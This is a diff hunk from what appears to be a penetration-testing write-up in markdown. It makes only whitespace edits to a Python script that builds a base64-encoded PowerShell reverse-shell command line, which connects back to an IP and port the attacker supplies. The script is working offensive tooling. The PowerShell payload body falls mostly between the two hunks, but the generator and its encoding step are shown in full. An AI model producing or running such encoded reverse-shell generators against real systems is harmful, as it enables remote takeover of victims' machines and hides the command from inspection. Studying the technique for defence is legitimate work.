@@ -44,20 +44,16 @@ We use this script to create a reverse powershell with base64 encoded
 ```python
 #!/usr/bin/env python3
 # generate reverse powershell cmdline with base64 encoded args
-
 import sys
 import base64
-
 def help():
     print("USAGE: %s IP PORT" % sys.argv[0])
     print("Returns reverse shell PowerShell base64 encoded cmdline payload connecting to IP:PORT")
-    exit()
-    
+    exit()   
 try:
     (ip, port) = (sys.argv[1], int(sys.argv[2]))
 except:
     help()
-
 # payload from Nikhil Mittal @samratashok
 # https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
 #1. It creates a TCP client in powershell 
@@ -82,12 +78,10 @@ $stream.Flush()};
 $client.Close()'
 #Take a commands chain  and replace their parts with the ip and port given
 payload = payload % (ip, port)
-
 #We enconde the payload to utf16 because it is the default encode chain
 #The is encode to base 64
 #Finally we encode to UNICODE which helps to limit the characters
 cmdline = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
-
 print(cmdline)
 ```
 
